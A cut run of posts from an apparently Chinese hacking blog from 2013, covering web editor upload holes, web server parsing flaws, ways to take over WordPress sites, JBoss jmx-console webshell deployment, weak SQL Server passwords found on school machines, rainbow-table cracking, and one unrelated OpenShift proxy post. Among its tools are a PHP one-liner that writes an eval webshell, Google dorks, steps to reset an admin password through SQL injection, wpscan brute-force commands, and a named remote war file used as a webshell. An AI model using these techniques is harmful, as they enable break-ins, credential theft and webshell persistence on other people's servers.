<p><a><a href="http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector" target="_blank" rel="external">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector</a></a>?</p>
<p>Command=FileUpload&amp;Type=Image&amp;CurrentFolder=%2F</p>
<p><a><a href="http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector" target="_blank" rel="external">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector</a></a>?</p>
<p>Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F<br>上传shell的地址:<br><a><a href="http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html" target="_blank" rel="external">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html</a></a>?</p>
<p>Type=Image&amp;Connector=connectors/jsp/connector</p>
<p>四：southidceditor</p>
<p>1.</p>
<p><a><a href="http://www.xhkjit.com/admin/southidceditor/datas/southidceditor.mdb" target="_blank" rel="external">http://www.xhkjit.com/admin/southidceditor/datas/southidceditor.mdb</a></a></p>
<p><a><a href="http://www.xhkjit.com/admin/southidceditor/popup.asp" target="_blank" rel="external">http://www.xhkjit.com/admin/southidceditor/popup.asp</a></a></p>
<p><a><a href="http://www.xhkjit.com/admin/southidceditor/admin/admin_login.asp" target="_blank" rel="external">http://www.xhkjit.com/admin/southidceditor/admin/admin_login.asp</a></a></p>
<p>2.southidceditor存在一个可以抓包上传的漏洞</p>
<p>Google:inurl:(admin/SouthidcEditor/PopUp.asp)</p>
<p>nc抓包自己玩玩吧.<br>五：bigcneditor(这个我没有找到具体的漏洞,网上的文章也都比较不负责任,谁知道的请告诉我下,谢谢)</p>
<p>这个页不多说了</p>
<p>原理都差不多！</p>
<p>防范方法很简单就不多讲了，</p>
<p>六：CuteEditor编辑器通杀漏洞</p>
<p>CuteEditor编辑器是.NET下最常用的一个编辑器..<br>十分的强大..也许是因为他太强了 HEHE ..<br>我们随便找到一个装有此编辑器的网站 点击插入图片 FLASH 影音文件 什么的都可以出来一个对话框.<br>在这个对话框里可以游览用户所上传的数据还有目录..郁闷的是居然可以新建..移动..修改..<br>在官网上甚至连删除都弄出来了..呵呵.. 我们这次主要是利用2003服务器的特性来进行利用..<br>大家都知道在2003的IIS环境下 如果你建一个 XXX.asp 文件夹的话 里面不管放什么其他类型的文件<br>在IIS里都会通过文件夹名的类型来解析 也就是说你传一个JPG的东西到 XXX.ASP下也会以ASP脚本<br>来进行解析..我们这里就利用他这一特性…首先我们随便找一个编辑器 然后选择插入图片吧(如图1)..插入其他的<br>东西都行..只要能新建文件目录..或者可以移动目录..</p>
<p>看这里就有新建文件夹等等一些操作的按钮我们新建一个..如果新建不能用可以试试移动文件夹把以有的文件夹名改成 XXX.asp形</p>
<p>式..</p>
<p>好了.我们新建一个 <a>www.asp</a> 文件夹.</p>
<p>确定..我们的文件夹就建好了..然后点击进入该文件夹 (</p>
<p>然后到了最关键的…我们上传文件..<br>用插入图片是上传不了的..他会检测是不是正常的图片..<br>可以试试 插入 FLASH<br>或者插入 视频 音乐文件..我们这里就插入视频.. 然后直接把 我们要传上去的马后缀改为 .avi形式<br>然后进入我们刚才新建的那个目录 然后上传 .. 文件就上去了</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Hack/">Hack</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-370" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/02/07/370/" class="article-date">
  	<time datetime="2013-02-07T11:07:38.000Z" itemprop="datePublished">2013-02-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/02/07/370/">各大Web服务器解析漏洞总结</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>各大Web服务器解析漏洞总结<br>From:90sec</p>
<p>[+]IIS 6.0</p>
<p>&nbsp;</p>
<p><pre>目录解析：/xx.asp/xx.jpg  xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码 IIS6.0会将 xx.jpg 解析为 asp 文件。后缀解析：/xx.asp;.jpg     /xx.asp:.jpg(此处需抓包修改文件名) IIS6.0都会把此类后缀文件成功解析为 asp 文件。默认解析：/xx.asa    /xx.cer   /xx.cdx IIS6.0默认的可执行文件除了 asp 还包含这三种此处可联系利用目录解析漏洞/xx.asa/xx.jpg 或/xx.cer/xx.jpg 或 xx.asa;.jpg</pre><br>&nbsp;</p>
<p>[+]IIS 7.0/IIS 7.5/Nginx &lt;8.03</p>
<p>&nbsp;</p>
<p><pre>IIS 7.0/IIS 7.5/Nginx&lt;8.03在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。常用利用方法：将一张图和一个写入后门代码的文本文件合并将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾  e.g.  copy xx.jpg/b + yy.txt/a xy.jpg ######################################/b 即二进制[binary]模式/a 即ascii模式 xx.jpg正常图片文件  yy.txt 内容&lt;?PHP fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;意思为写入一个内容为&lt;?php eval($_POST[cmd])?&gt;名称为shell.php的文件######################################找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上/xx.php 即可执行恶意文本。然后就在图片目录下生成一句话木马 shell.php 密码 cmd</pre><br>&nbsp;</p>
<p>[+]Nginx &lt;8.03</p>
<p>&nbsp;</p>
<p><pre>在Fast-CGI关闭的情况下，Nginx&lt;8.03依然存在解析漏洞在一个文件路径(/xx.jpg)后面加上%00.php会将/xx.jpg%00.php解析为 php 文件。</pre><br>&nbsp;</p>
<p>[+]Apache</p>
<p>&nbsp;</p>
<p><pre>后缀解析：test.php.x1.x2.x3  Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析  test.php.x1.x2.x3 则会被解析为php 经验之谈：php|php3|phtml 多可被Apache解析</pre><br>&nbsp;</p>
<p>[+]其他一些可利用的</p>
<p>&nbsp;</p>
<p><pre>在windows环境下，xx.jpg[空格]或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，这也是可以被利用的！在向一台windows主机上传数据时，你可以抓包修改文件名，在后面加个空格或点，试图绕过黑名单，若上传成功，最后的点或空格都会被消除，这样就可得到shell。我记得FckPhp2.6就存在加空格绕过的漏洞。{Linux主机中不行，Linux允许这类文件存在}如果在Apache中.htaccess可被执行（默认不执行，这是90sec里的一位朋友说的，当初我并不知道），且可以被上传，那可以尝试在.htaccess中写入:&lt;FilesMatch“shell.jpg”&gt;SetHandler application/x-httpd-php &lt;/FilesMatch&gt; shell.jpg换成你上传的文件，这样shell.jpg就可解析为php文件</pre><br>&nbsp;</p>
<p>[+]lighttpd</p>
<p>&nbsp;</p>
<p><pre>xx.jpg/xx.php  [Addby loser]</pre><br>&nbsp;</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Hack/">Hack</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-364" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/02/05/364/" class="article-date">
  	<time datetime="2013-02-05T13:49:41.000Z" itemprop="datePublished">2013-02-05</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/02/05/364/">如何拿wordpress站 汇总</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>现在wp站点满地都是, 虽然都是个人博客, 但可利用的地方就很多了, 而且最主要的是, 进了wp后台就相当于得到了webshell!!<br>1) 很多大站的站长都会有个个人博客, 在通过数据库查到其密码后而目标站的密码已更改, 各种组合失败, 这时尝试一下个人博客, 有很大的几率是没有更改密码的.</p>
<p>2) 国内外极大部分的大牛们的博客都是wordpress架设的, 而且搞下大牛们的wp站也是装B的好方法. xD</p>
<p>3) wp站是旁注的入手点!!</p>
<p>4) 1337和exploit-db天天有人爆插件漏洞, 得手几率一直在上升, 而且插件都是开源的, 如果目标站的插件没有漏洞, 你也可以自己针对对方的插件自己挖洞 ;D</p>
<p>5) 因为wp的加密太高端, 我遇到的hash解密全部失败.. 很蛋疼.. 前两天看不记得在哪里看到有人说有wp的0day直接爆明文, 呃, 震惊了一下, 太扯了, 不过还是看了一下wp, 发现wp_users里还有个user_activation_key, 恩, 等下要讲一下这个的利用方法.</p>
<p>6) 因为我不再用wp了 xD  请大家支持国产 sa blog, typecho, emlog, z-blog, pjblog 等等 ^^</p>
<p>——接下来就开始详述拿wp方法了..——</p>
<p>1, 社工得到站长密码, 登陆仪表盘拿shell.</p>
<ul>
<li>这个方法的关键就在社工的地方, 如果得到了密码剩下就基本没问题了. [这里就不叙述社工的细节了, 太多了..]不过sinapp上的wordpress里主题和插件是不允许在线修改的, 所以还需要其他方式. [不过拿sinapp上的wp站也没什么用, 纯为装X就没有必要了. 或许会是某位大牛写了篇需要验证的文章, 而你需要去读这篇文章. 在从后台直接查看.]<br>-后台拿shell太简单, 就不说了.</li>
</ul>
<p>2, 旁注.. 这可老生常谈了.. 就不详述了..</p>
<p>3, 呃在补充一下第一条, 也不仅仅适用于wp, 有时确认了一个目标站站长的常用密码, 使用失败的情况下, 可以尝试一下ftp,ssh之类的地方, 查一查2级域名, bing一下域名, 惊喜总在不经意间来临.</p>
<p>4, 在就是插件漏洞了, 这个现在虽然不算很多, 但也一直在增长, 而且有一点是你可以针对目标站所使用的插件来研究一下. 当然, 使用人数多的插件基本都被很多人检测过了, 但有许多冷门插件用的人还是很多的.</p>
<ul>
<li>这里在来个tip吧, 在主页查看源文件, ctrl+f一下plugins, 跟在wp-content后面的, 在他后面的名字[可能是文件夹也可能是文件]就是一个插件, google一下肯定会得到. 而有些插件在首页是不调用的, 或许在comments页里, 或许在文章里等等, 需要自己去探索了.<br>-现在在说下插件有漏洞的情况下.<br>[tip:有个俄罗斯人写的程序Wordpress P&amp;E可以搜索目标wp站的插件, 并注明是否有漏洞, 不过只有153个插件, 然后1337有个程序可以搜索joomla和wp等站的危险插件, 是php程序, 在sourceforge就有的下, 大家可以去下载一个. 然后就是在1337,exploit-db,goole上搜索该插件是否有漏洞了.]</li>
</ul>
<p>记得09年时wp爆过一个重置管理口令的漏洞, 现在用法差不多, 也是我刚刚发现, 网上也没找到有讲述关于这个的.</p>
<p>前提:是在有注入点, 密码解不开, 无法output的情况下获取shell的情况下使用的.</p>
<p>这个其实也不算漏洞, 就是结合起来能利用到而已. 因为wp的找回密码系统对管理员账户同样生效, 而发送至邮箱的key在数据库中同样保存下来, 所以就可以直接更改管理员密码 xD</p>
<p>步骤如下:<br>1) inject出wp-users表里ID为1[或许更改, 随机应变]的user_login或user_email; [未知管理员后台账户的情况下]<br>2) 在wp-login.php处点击 ‘忘记密码’ [lost password],如果被隐藏或没有可以直接访问wp-login.php?action=lostpassword页面, 输入管理员账户或管理员邮箱, 点击’获取新密码’ .<br>3) 再次inject出wp-users表里ID为1或目标值的user_activation_key.<br>4) 访问wp-login.php?action=rp&amp;key=<span style="color: red;">KEY</span>&amp;login=NAME<br>5) 将KEY替换为注射出的user_activation_key的值, 将NAME替换为管理员账号并访问该页面.<br>-例:<a href="http://blog.adm1n.org/wp-login.php?action=rp&amp;key=" target="_blank" rel="external">http://blog.adm1n.org/wp-login.php?action=rp&amp;key=</a><span style="color: red;">ixUrwKCCycGqlGwWQ6vx</span>&amp;login=Adm1n_oRg<br>6) 输入新密码, 要7位以上哦.</p>
<p>&nbsp;</p>
<p>简单点就是</p>
<p>1.社工库，进后台，编辑模板拿shell</p>
<p>2.旁注</p>
<p>3.扫插件，然后1337,exploit-db上找插件漏洞。</p>
<p>使用wordpressp&amp;e 来扫插件。俄文，估计看不懂，不过没关系，简单的很。</p>
<p>下载<a href="http://7xnueu.com1.z0.glb.clouddn.com/2012/10/BackTrack5.zip" target="_blank" rel="external"> <a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/02/WordpressPE.zip" target="_blank" rel="external">WordpressPE</a> </a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130205215048.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130205215048.png" alt="QQ20130205215048"></a></p>
<p>4.使用wpscan</p>
<p><a href="http://houwenhui.gotoip2.com/archives/742" target="_blank" rel="external">http://houwenhui.gotoip2.com/archives/742</a></p>
<p>1.安装svn</p>
<blockquote>
<p>sudo apt-get install subversion<br>2.通过svn安装wpscan<br>svn checkout <a href="http://wpscan.googlecode.com/svn/trunk/" target="_blank" rel="external">http://wpscan.googlecode.com/svn/trunk/</a> ./wpscan<br>3.安装依赖包<br>cd wpscan</p>
<p>cat README<br>(根据提示安装，不同平台的安装是不同的。我这里是安装ubuntu的)<br>sudo apt-get install libcurl4-gnutls-dev libopenssl-ruby</p>
<p>sudo gem install typhoeus xml-simple<br>提示：sudo: gem: command not found</p>
</blockquote>
<p>解决：</p>
<blockquote>
<p>sudo apt-get install rubygems</p>
<p>sudo gem install typhoeus xml-simple</p>
<p>示例：</p>
<p>Do ‘non-intrusive’ checks…</p>
<p>ruby ./wpscan.rb –url www.example.com</p>
<p>Do wordlist password brute force on enumerated users using 50 threads…</p>
<p>ruby ./wpscan.rb –url www.example.com –wordlist darkc0de.lst –threads 50</p>
<p>Do wordlist password brute force on the ‘admin’ username only…</p>
<p>ruby ./wpscan.rb –url www.example.com –wordlist darkc0de.lst –username admin</p>
<p>Generate a new ‘most popular’ plugin list, up to 150 pages…</p>
<p>ruby ./wpscan.rb –generate_plugin_list 150</p>
<p>Enumerate instaled plugins…</p>
<p>ruby ./wpscan.rb –url www.example.com –enumerate p<br>5.使用后台密码暴力破解。</p>
</blockquote>
<p><a href="http://www.bohaishibei.com/?author=2" target="_blank" rel="external"> </a></p>
<div><br><br>WorkPress使用了一个”author”的参数。这个参数接受一个数字作为值，并且返回这个用户id对应的页面。<br>例如：<a href="http://www.hack1990.com/?author=1" target="_blank" rel="external">http://www.xxxx.com/?author=1</a><br>存在的问题是：<br>1、用户ID是顺序递增的。<br>2、如果这个ID的用户存在，则会返回包含有这个用户用户名的页面。<br>这些问题可能导致下面的攻击：<br>1、可以通过请求检验到这个用户的ID是否存在<br>2、返回的页面泄漏了和这个用户ID对应的用户名。<br>攻击者可能会遍历一些ID。这样就可以枚举出系统内所有的用户名。<br>受影响的版本：<br>2.6, 3.1, 3.1.1, 3.1.3, 3.2-beta2以及其他的版本也可能受影响。<br>验证原理就很简单了：<br>请求<a href="http://www.hack1990.com/?author=1" target="_blank" rel="external">http://www.xxxx.com/?author=1</a>(这里1可以替换为其他数字)<br>然后在返回的页面中过滤用户名的那个地方(注意不同语言版本的差别)，<br><br>&nbsp;<br><br>这样可以获取到用户名，然后载入脚本进行破解。破解脚本比较多。msf里也有<br><br></div>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Hack/">Hack</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-352" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/02/01/352/" class="article-date">
  	<time datetime="2013-02-01T16:23:23.000Z" itemprop="datePublished">2013-02-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/02/01/352/">继续折腾一下openshift</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>由于在做一个html5的游戏，需要用到node.js,可能自己会写完，但是更大的可能是懒的写了。</p>
<p>先搞一个如何绑定域名的。</p>
<p>openshift要使用自己的rhc client来管理，安装方式可以参考这里：</p>
<p><a href="https://access.redhat.com/knowledge/docs/en-US/OpenShift/2.0/html/Getting_Started_Guide/sect-Getting_Started_Guide-OpenShift_Client_Tools-Installing_Client_Tools.html#sect-Getting_Started_Guide-Installing_on_Windows" target="_blank" rel="external">windows</a>，linux可以进去后重新选择。</p>
<p>RubyInstaller ，Git其实就是安装这2个。</p>
<p>然后打开命令行,shuru :</p>
<pre><code>gem install rhc`
可能没反应，等一会就行了。<span class="xml"><span class="tag">&lt;/<span class="title">pre</span>&gt;</span></span>
<span class="xml"><span class="tag">&lt;<span class="title">pre</span> <span class="attribute">style</span>=<span class="value">"color: #333333;"</span>&gt;</span></span>[<span class="link_label">![QQ20130202003621</span>](<span class="link_url">http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130202003621.png</span>)

](http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130202003621.png)<span class="xml"><span class="tag">&lt;/<span class="title">pre</span>&gt;</span></span>
<span class="xml"><span class="tag">&lt;<span class="title">pre</span>&gt;</span></span>`然后输入rhc setup，继续敲用户名和密码，可以进入管理。
具体的可以参考这里：[http://www.freehao123.com/openshift-redhat/2/
](http://www.freehao123.com/openshift-redhat/2/)，我这就不多说了，绑一下域名，先在dnspod里给自己域名添加一个cname，这里解析到proxy.chenxing.org.cn，先弄一个在线代理，虽然github已经可以访问了，但是还是方便点，用处你懂的。
[<span class="link_label">![QQ20130202002903</span>](<span class="link_url">http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130202002903.png</span>)](<span class="link_url">http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130202002903.png</span>)
</code></pre><pre style="color: #333333;"></pre>
<pre>然后再输入   $ rhc alias add test proxy.chenxing.org.cn
绑定成功。

[![QQ20130202002921](http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130202002921.png)
](http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130202002921.png)然后找到一个在线代理给挂上。咋咋，顺手改了几个字
百度：glype，就可以找到。可以加入收藏夹哦，速度很快的说。
[http://proxy.chenxing.org.cn](http://proxy.chenxing.org.cn/)

[![QQ20130202022124](http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130202022124.png)](http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130202022124.png) [![QQ20130202022155](http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130202022155.png)](http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130202022155.png)</pre>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/云/">云</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Web/">Web</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-342" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/01/15/342/" class="article-date">
  	<time datetime="2013-01-15T16:07:27.000Z" itemprop="datePublished">2013-01-15</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/01/15/342/">忙活好久了，总结点东西</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>学校的安全还是完全靠请的公司啊。</p>
<p>每台电脑划分一个vlan，cain挂了。</p>
<p>但是俄们是用友的娃，每台电脑上都装u8.这sql的安装。。</p>
<p>然后发现了，</p>
<p>sa/null 老师的机子</p>
<p>sa/123 童鞋的实验室。</p>
<p>童鞋的电脑呢是不会装这个的。</p>
<p><span style="color: #ff0000;"> sql的语句呢一定要一句一句写，不能一起写掉</span></p>
<p>估到了很多额额额额。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/吐槽/">吐槽</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Life/">Life</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-331" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/01/15/331/" class="article-date">
  	<time datetime="2013-01-15T11:30:12.000Z" itemprop="datePublished">2013-01-15</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/01/15/331/">JBOSS育软电子政务平台</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>学校一片的这个，一般是扫mysql弱口令，然后进后台，可是后台不知道怎么拿shell。</p>
<p>通用的方法就是利用JBOSS漏洞进入。</p>
<p><a href="http://dlinux.sinaapp.com/2013/01/15/hackjboss%e8%82%b2%e8%bd%af%e7%94%b5%e5%ad%90%e6%94%bf%e5%8a%a1%e5%b9%b3%e5%8f%b0/%e5%9b%be%e7%89%871/" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/01/1.png" alt="图片1"></a></p>
<p>后台就是这样的可是确实不好拿shell。<a href="http://dlinux.sinaapp.com/2013/01/15/hackjboss%e8%82%b2%e8%bd%af%e7%94%b5%e5%ad%90%e6%94%bf%e5%8a%a1%e5%b9%b3%e5%8f%b0/qq%e6%88%aa%e5%9b%be20130115212113/" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/01/QQ20130115212113.png" alt="QQ20130115212113"></a></p>
<p>JBOSS默认配置会有一个后台漏洞，漏洞发生在<strong>jboss.deployment命名空间</strong></p>
<p>中的<strong>addURL()函数,</strong>该函数可以远程下载一个war压缩包并解压</p>
<p>访问<a href="http://www.safe3.com.cn:8080/jmx-console/" target="_blank" rel="external">http://www.safe3.com.cn:8080/jmx-console/</a> 后台，如下图</p>
<p><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/01/133014QSP.jpg" alt="" title="2010010816232452"></p>
<p>下拉找到如下图所示</p>
<p><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/01/133015m33.jpg" alt="" title="2010010816245041"></p>
<p>点击flavor=URL,type=DeploymentScanner进入</p>
<p><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/01/133015ql5.jpg" alt="" title="2010010816281370"></p>
<p>在输入框中写入war压缩文件webshell的url地址，如上图</p>
<p><a href="http://test-mozutaba.rhcloud.com/job.war" target="_blank" rel="external">http://test-mozutaba.rhcloud.com/job.war</a></p>
<p>点击invoke执行界面获得一个jsp的webshell，如下图，shell拿一堆了。</p>
<p>http：//xxx.com/job/index.jsp</p>
<p>&nbsp;</p>
<p><a href="http://dlinux.sinaapp.com/2013/01/15/hackjboss%e8%82%b2%e8%bd%af%e7%94%b5%e5%ad%90%e6%94%bf%e5%8a%a1%e5%b9%b3%e5%8f%b0/qq%e6%88%aa%e5%9b%be20130115212736/" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/01/QQ20130115212736.png" alt="QQ20130115212736"></a></p>
<p>&nbsp;</p>
<p><strong>临时漏洞修补办法：</strong>给jmx-console加上访问密码</p>
<p>1.在 ${jboss.server.home.dir}/deploy下面找到jmx-console.war目录编辑WEB-INF/web.xml文件 去掉 security-constraint 块的注释，使其起作用</p>
<p>2.编辑WEB-INF/classes/jmx-console-users.properties或server/default/conf/props/jmx-console-users.properties (version &gt;=4.0.2)和 WEB-INF/classes/jmx-console-roles.properties</p>
<p>或server/default/conf/props/jmx-console-roles.properties(version &gt;=4.0.2) 添加用户名密码</p>
<p>3.编辑WEB-INF/jboss-web.xml去掉 security-domain 块的注释 ，security-domain值的映射文件为 login-config.xml （该文件定义了登录授权方式）</p>
<p>war文件可以在这里下载。解压rar就是war了。</p>
<p><a href="http://dlinux.sinaapp.com/2013/01/15/hackjboss%e8%82%b2%e8%bd%af%e7%94%b5%e5%ad%90%e6%94%bf%e5%8a%a1%e5%b9%b3%e5%8f%b0/job/" target="_blank" rel="external">job</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Hack/">Hack</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-328" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/01/15/328/" class="article-date">
  	<time datetime="2013-01-15T10:56:21.000Z" itemprop="datePublished">2013-01-15</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/01/15/328/">彩虹表的学习</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>今天抓了个hash，就去网上找了找彩虹表。以前都是看120g，60g，1.5t不敢下。现在发现怎么也要准备一个了，把片片删掉，来放裤裤和这个吧。</p>
<p># </p>
<h1 id="免费彩虹表破解工具汇总+收费彩虹表下载（种子）+LM和NTLM小科普">免费彩虹表破解工具汇总+收费彩虹表下载（种子）+LM和NTLM小科普</h1><div><br><div id="blog_text"><br><br>&nbsp;<br><br>常见的三种<a href="http://hi.baidu.com/hcocoa/blog/item/c03eefda3f11176fd1164e88.html" target="_blank" rel="external">彩虹表</a>工具：<br><br><strong>1.ophcrack（</strong><a href="http://ophcrack.sourceforge.net/" target="_blank" rel="external"><strong>http://ophcrack.sourceforge.net/</strong></a><strong>）</strong><br><br>&nbsp;<br><div><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/01/125624KyI.jpg" alt="免费彩虹表破解工具汇总+收费彩虹表下载（种子）+LM和NTLM小科普 - Wei - 海上升明月 天涯共此时"></div><br>我最常用的 界面友好 与众不同 压缩储存 有自己独特的<a href="http://hi.baidu.com/hcocoa/blog/item/c03eefda3f11176fd1164e88.html" target="_blank" rel="external">彩虹表</a>结构 还有Live CD……支持的HASH类型：LM，NTLM<br><br>扩展名：乱七八糟的……<br><br>高级的表要花钱买，<a href="http://hi.baidu.com/hcocoa/blog/item/c03eefda3f11176fd1164e88.html" target="_blank" rel="external">免费的表</a>有（推荐只下2和5，要求高的可以下载3和5）：<br><br><span style="color: #008000;">我下了<a href="http://downloads.sourceforge.net/ophcrack/tables_xp_free_fast.zip" target="_blank" rel="external"><span style="color: #008000;">XP free fast (703MB)</span></a>，<a href="http://downloads.sourceforge.net/ophcrack/tables_vista_free.zip" target="_blank" rel="external"><span style="color: #008000;">Vista free (461MB)</span></a>。空间不怎么够啊。</span><br><br>1.XP free（LM表：包含大小写+数字）380MB（<a href="http://downloads.sourceforge.net/ophcrack/tables_xp_free_small.zip" target="_blank" rel="external">官网</a><a href="http://downloads.sourceforge.net/ophcrack/tables_xp_free_small.zip" target="_blank" rel="external">免费下载</a>）<br>2.XP free fast（和前一个一样，但是速度更快）703MB（<a href="http://downloads.sourceforge.net/ophcrack/tables_xp_free_fast.zip" target="_blank" rel="external">官网</a><a href="http://downloads.sourceforge.net/ophcrack/tables_xp_free_fast.zip" target="_blank" rel="external">免费下载</a>）<br>3.XP special（LM表：大小写+数字+所有符号包括空格）7.5G（<a href="http://www.hexsafe.com/download/Ophcrack%20XP%20Special%20Tables.torrent" target="_blank" rel="external">种子下载</a>）<br>4.Vista free （NTLM表：包含常用密码）461MB（<a href="http://downloads.sourceforge.net/ophcrack/tables_vista_free.zip" target="_blank" rel="external">官网</a><a href="http://downloads.sourceforge.net/ophcrack/tables_vista_free.zip" target="_blank" rel="external">免费下载</a>）<br>5.Vista special（NTLM表：包含6位的全部可打印字符，7位的大小写字母数字，8位的小写和数字）8G（<a href="http://www.hexsafe.com/download/Ophcrack%20Vista%20Special%20NTHASH%20Table.torrent" target="_blank" rel="external">种子下载</a>）<br><br><strong>2.RainbowCrack（</strong><a href="http://project-rainbowcrack.com/" target="_blank" rel="external"><strong>http://project-rainbowcrack.com/</strong></a><strong>）</strong><br><br>通用的 一般的<a href="http://hi.baidu.com/hcocoa/blog/item/c03eefda3f11176fd1164e88.html" target="_blank" rel="external">破解软件</a>如saminside都支持 命令行界面 黑客的最爱 居家旅行杀人放火之必备 支持CUDA<br><br>可以自己生成表 不要钱 传说中的120G就来自于此……<br><br>支持HASH类型：LM, NTLM, MD5, SHA1, MYSQLSHA1, HALFLMCHALL, NTLMCHALL.<br><br>扩展名：rt<br><br>120G的种子：<a href="http://simeon.blog.51cto.com/attachment/200811/18680_1225698125.rar" 